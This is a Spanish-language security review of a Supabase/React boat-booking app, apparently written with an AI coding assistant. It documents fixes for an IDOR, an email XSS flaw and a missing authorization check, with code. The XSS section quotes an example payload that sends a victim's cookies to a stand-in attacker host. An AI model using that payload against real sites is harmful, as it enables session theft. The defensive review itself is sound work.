# Revisión y Correcciones de Seguridad — Barco Pirata

**Fecha:** 2026-04-25  
**Rama:** main  
**Realizadas por:** Claude Code (Anthropic) junto con Jesus Sanchez

---

## Contexto

Se realizó un análisis completo de seguridad sobre el proyecto *Barco Pirata*, una aplicación web de reservas para turismo náutico en Puerto Peñasco, Sonora. El stack es React 18 + TypeScript + Supabase (PostgreSQL + RLS + Edge Functions Deno) + Stripe.

El análisis identificó **4 vulnerabilidades críticas**, **4 altas** y **4 medias**. En esta sesión se corrigieron las 4 críticas.

---

## Vulnerabilidades identificadas (resumen completo)

### Críticas
| # | Descripción | Estado |
|---|-------------|--------|
| C1 | Credenciales reales en el repositorio (`.env.local`) | Sin acción — ya estaba bien |
| C2 | IDOR: usuario anónimo puede listar todas las reservas recientes | **Corregido** |
| C3 | XSS en el HTML del email de recibo (`buildHtml`) | **Corregido** |
| C4 | Edge function `send-receipt` sin autenticación ni autorización | **Corregido** |

### Altas (pendientes)
| # | Descripción |
|---|-------------|
| A1 | Rate limiting solo por teléfono — fácil de eludir |
| A2 | CORS abierto (`*`) en Edge Functions |
| A3 | `updateEmail()` sin verificación de propiedad |
| A4 | Sin idempotency key en `createPaymentIntent` (riesgo de doble cobro) |

### Medias (pendientes)
| # | Descripción |
|---|-------------|
| M1 | Sin validación de transiciones de estado en reservaciones |
| M2 | `is_staff()` / `is_admin()` marcadas `STABLE` en lugar de `VOLATILE` |
| M3 | Sin session timeout en el panel admin |
| M4 | Sin Content Security Policy (CSP) headers |

---

## Corrección C1 — Credenciales en repositorio

### Hallazgo
El análisis inicial indicó que `.env.local` podría contener credenciales reales. Se verificó el estado real del repositorio.

### Resultado de la verificación
```bash
git ls-files --error-unmatch .env.local
# error: pathspec '.env.local' did not match any file(s) known to git
```

`.env.local` **nunca fue commiteado**. El archivo `.gitignore` ya contenía las reglas correctas:

```
*.local
.env
.env.local
.env.*.local
!.env.example
```

**No se requirió ninguna acción.** El punto estaba correctamente configurado desde el inicio.

---

## Corrección C2 — IDOR en lectura de reservaciones

### Problema
**Archivo afectado:** `supabase/migrations/00004_security_hardening.sql` (línea 100–103)

La política RLS `anon_select_recent_reservation` permitía a cualquier usuario anónimo ejecutar:

```sql
SELECT * FROM reservations
WHERE created_at >= now() - interval '30 days'
```

Esto exponía nombres completos, teléfonos, emails y detalles de reserva de **todos los clientes de los últimos 30 días** sin ninguna restricción. Un atacante con acceso a la API de Supabase (que usa el anon key, que es público) podía extraer todos esos datos con un script simple.

La política pretendía permitir que un cliente vea "su propia" reserva, pero la condición `using (true)` no filtraba por ningún identificador del solicitante.

### Solución

**Enfoque adoptado:** reemplazar el acceso directo a la tabla por una función `SECURITY DEFINER` que solo devuelve una fila dado su UUID exacto. Como un UUID tiene 122 bits de entropía, conocerlo equivale a tener permiso (el cliente lo recibe al crear su reserva).

#### Archivo nuevo: `supabase/migrations/00010_fix_idor_rls.sql`

```sql
-- 1. Eliminar las políticas permisivas
drop policy if exists "anon_select_recent_reservation" on public.reservations;
drop policy if exists "anon_select_own_reservation"    on public.reservations;

-- 2. Función segura: solo devuelve la fila cuyo id coincide exactamente
create or replace function public.get_reservation_by_id(p_id uuid)
returns setof public.reservations
language sql
security definer
stable
set search_path = public, pg_catalog
as $$
  select * from public.reservations where id = p_id;
$$;

-- 3. Permisos: solo anon y authenticated pueden ejecutar la función
revoke all on function public.get_reservation_by_id(uuid) from public;
grant execute on function public.get_reservation_by_id(uuid) to anon, authenticated;
```

Por qué `SECURITY DEFINER`: la función se ejecuta con los permisos del owner (postgres), ignorando las políticas RLS del llamante anónimo. Esto elimina la posibilidad de que el cliente haga queries arbitrarios sobre la tabla.

#### Archivo modificado: `src/features/reservations/services/reservationService.ts`

`getById()` pasó de acceso directo a la tabla a llamar la RPC:

```typescript
// ANTES (acceso directo — anon podía listar sin filtro)
async getById(id: string): Promise<Reservation> {
  const { data, error } = await supabase
    .from('reservations')
    .select('*')
    .eq('id', id)
    .single()
  ...
}

// DESPUÉS (RPC controlada — solo devuelve la fila del UUID exacto)
async getById(id: string): Promise<Reservation> {
  const { data, error } = await supabase
    .rpc('get_reservation_by_id', { p_id: id })
    .single()
  ...
}
```

### Impacto de la corrección
- Usuarios anónimos ya **no pueden enumerar ni listar** reservaciones, aunque llamen directamente a la API REST de Supabase.
- El flujo de cliente sigue funcionando: al crear una reserva recibe el UUID, y con ese UUID puede consultar su propia reserva.
- El staff autenticado sigue usando la política `staff_select_reservations` con acceso completo a la tabla.

---

## Corrección C3 — XSS en el HTML del email de recibo

### Problema
**Archivo afectado:** `supabase/functions/send-receipt/index.ts`

La función `buildHtml()` construye el HTML del email interpolando valores de la base de datos directamente sin escaparlos:

```typescript
// VULNERABLE — contact_name sin escapar
${row('Cliente', r.contact_name)}

// La función row() también insertaba el valor sin escapar
function row(label: string, value: unknown): string {
  return `...
    <td ...>${String(value ?? '')}</td>  // ← sin escaping
  ...`
}

// El folio también era vulnerable
<div ...>${r.id}</div>  // ← sin escaping
```

Si un atacante registrara una reserva con `contact_name = <img src=x onerror="fetch('https://attacker.com/?d='+document.cookie)">`, ese código se ejecutaría en el navegador o cliente de correo del destinatario al abrir el email.

### Solución

Se añadió una función `escapeHtml()` que convierte los 5 caracteres especiales de HTML en sus entidades seguras, y se aplicó en todos los puntos donde se interpolan valores de la BD.

#### Cambio 1 — nueva función `escapeHtml()`

```typescript
function escapeHtml(s: string): string {
  return s
    .replace(/&/g,  '&amp;')
    .replace(/</g,  '&lt;')
    .replace(/>/g,  '&gt;')
    .replace(/"/g,  '&quot;')
    .replace(/'/g,  '&#x27;')
}
```

Se añadió justo después de la definición de `PACKAGE_LABELS`.

#### Cambio 2 — función `row()` corregida

```typescript
// ANTES
function row(label: string, value: unknown): string {
  return `...
    <td ...>${String(value ?? '')}</td>
  ...`
}

// DESPUÉS
function row(label: string, value: unknown): string {
  return `...
    <td ...>${escapeHtml(String(value ?? ''))}</td>
  ...`
}
```

Este cambio cubre automáticamente: `contact_name`, `contact_phone`, `contact_email`, `date` (formateado), `time`, `number_of_people` y `package_id`.

#### Cambio 3 — folio corregido

```typescript
// ANTES
<div ...>${r.id}</div>

// DESPUÉS
<div ...>${escapeHtml(String(r.id ?? ''))}</div>
```

### Impacto de la corrección
- Cualquier caracter HTML especial en los datos del cliente se muestra como texto literal, nunca se interpreta como código.
- Un nombre como `<script>alert(1)</script>` aparecerá en el email como el texto `<script>alert(1)</script>` sin ejecutarse.

---

## Corrección C4 — Edge function `send-receipt` sin autorización

### Problema
**Archivo afectado:** `supabase/functions/send-receipt/index.ts`

La función se desplegaba con `--no-verify-jwt` y no tenía ninguna validación de autorización. Esto significaba que **cualquier persona en internet** podía:

1. Conocer un UUID de reserva (por ejemplo obtenido antes de la corrección C2)
2. Llamar la función con ese UUID y **cualquier email** como destino
3. El sistema enviaba el email con los datos del cliente (nombre, teléfono, fecha, paquete, total) a la dirección que el atacante eligiera

Vectores de ataque habilitados:
- **Spam dirigido:** enviar el recibo de alguien a una lista de emails arbitrarios
- **Email injection:** el parámetro `email` podía contener headers adicionales como `Bcc:`
- **Recolección de datos:** reenviar recibos de clientes al atacante para exfiltrar información

### Solución

Se añadió lógica de autorización a nivel de aplicación con dos reglas:

1. **Staff autenticado** (rol `admin` o `vendedor`): puede enviar a cualquier email. Se detecta extrayendo y verificando el JWT del header `Authorization`.
2. **Cliente anónimo**: el email destino debe coincidir exactamente con el `contact_email` guardado en la reserva.

`--no-verify-jwt` se mantiene porque es necesario para que los clientes anónimos que acaban de pagar puedan recibir su propio comprobante sin tener una sesión activa.

#### Código añadido (después de obtener la reserva)

```typescript
// ── Autorización ──────────────────────────────────────────────────────
const authHeader = req.headers.get('Authorization') ?? ''
let isStaff = false

if (authHeader.startsWith('Bearer ')) {
  const token = authHeader.slice(7)
  const { data: { user } } = await supabase.auth.getUser(token)
  if (user) {
    const { data: profile } = await supabase
      .from('user_profiles')
      .select('role')
      .eq('id', user.id)
      .single()
    isStaff = profile?.role === 'admin' || profile?.role === 'vendedor'
  }
}

if (!isStaff) {
  const storedEmail = (reservation.contact_email as string | null)?.trim().toLowerCase()
  if (!storedEmail || storedEmail !== email.trim().toLowerCase()) {
    return json({ error: 'No autorizado para enviar este recibo' }, 403)
  }
}
```

#### Por qué funciona con el flujo existente

`supabase.functions.invoke()` en el cliente incluye automáticamente el JWT de la sesión actual:
- **Staff autenticado:** el JWT corresponde a un usuario en `user_profiles` con rol `admin`/`vendedor` → `isStaff = true`
- **Cliente anónimo:** el JWT es el anon key, `auth.getUser()` devuelve error → `isStaff = false` → se valida el email

El flujo del cliente no cambia: el email que se pasa al llamar la función es el mismo que se guardó al momento del pago.

### Impacto de la corrección
- Un atacante con un UUID no puede enviar el recibo a su propio email ni a ningún otro ajeno.
- Solo el titular de la reserva (quien registró su email) puede recibir el comprobante.
- El staff puede seguir reenviando recibos desde el panel admin.

---

## Archivos extra — configuración Deno para VS Code

Durante la corrección C3 se detectaron errores falsos positivos del compilador TypeScript de Node.js al procesar archivos Deno (`Cannot find name 'Deno'`, módulos `https://deno.land/...` no encontrados). Estos errores existían antes de la sesión y no afectan el deploy real en Supabase.

Se crearon dos archivos para resolverlos:

### `.vscode/settings.json` (nuevo)
```json
{
  "deno.enablePaths": ["supabase/functions"],
  "deno.unstable": false,
  "[typescript]": {
    "editor.defaultFormatter": "denoland.vscode-deno"
  }
}
```
Le indica a VS Code que la carpeta `supabase/functions/` debe manejarse con la extensión de Deno, no con el TypeScript de Node.js.

### `supabase/functions/deno.json` (nuevo)
```json
{
  "compilerOptions": {
    "lib": ["deno.window"]
  },
  "imports": {
    "https://deno.land/std@0.203.0/": "https://deno.land/std@0.203.0/",
    "https://esm.sh/@supabase/supabase-js@2": "https://esm.sh/@supabase/supabase-js@2"
  }
}
```

**Requisito:** tener instalada la extensión [Deno para VS Code](https://marketplace.visualstudio.com/items?itemName=denoland.vscode-deno) y recargar la ventana (`Ctrl+Shift+P` → *Developer: Reload Window*).

---

## Archivos modificados en esta sesión

| Archivo | Tipo de cambio |
|---------|----------------|
| `supabase/migrations/00010_fix_idor_rls.sql` | **Nuevo** — migración que elimina políticas RLS permisivas y crea la función `get_reservation_by_id` |
| `src/features/reservations/services/reservationService.ts` | **Modificado** — `getById()` ahora usa `.rpc('get_reservation_by_id')` en lugar de acceso directo a la tabla |
| `supabase/functions/send-receipt/index.ts` | **Modificado** — añadida función `escapeHtml()`, aplicada en `row()` y en el folio; añadida lógica de autorización |
| `.vscode/settings.json` | **Nuevo** — habilita la extensión Deno para `supabase/functions/` |
| `supabase/functions/deno.json` | **Nuevo** — configuración del compilador Deno para la carpeta de funciones |

---

## Pasos para aplicar en producción

```bash
# 1. Aplicar la migración de base de datos
supabase db push

# 2. Redesplegar la edge function con los cambios
supabase functions deploy send-receipt --no-verify-jwt

# 3. (Opcional) Verificar que la función de autorización responde correctamente
# Llamar con email incorrecto debe devolver 403:
curl -X POST https://<proyecto>.supabase.co/functions/v1/send-receipt \
  -H "Content-Type: application/json" \
  -d '{"reservationId":"<uuid>","email":"otro@email.com"}'
# Esperado: {"error":"No autorizado para enviar este recibo"}
```

---

## Próximos pasos recomendados

Las siguientes vulnerabilidades quedaron identificadas pero no corregidas en esta sesión:

1. **A1 — Rate limiting por IP:** el límite actual solo valida por teléfono. Añadir validación por IP en la Edge Function o en un middleware.
2. **A2 — CORS:** cambiar `Access-Control-Allow-Origin: '*'` por el dominio real del app en ambas Edge Functions.
3. **A3 — `updateEmail()` sin confirmación:** antes de actualizar el email de una reserva, verificar que el solicitante es el titular o un miembro del staff.
4. **A4 — Idempotency key en Stripe:** pasar `idempotencyKey` al crear el `PaymentIntent` para evitar cobros duplicados si el cliente hace doble clic.
5. **M1 — Transiciones de estado:** validar en la base de datos que el cambio de estado sigue el flujo permitido: `pendiente → confirmada → pagada | cancelada`.
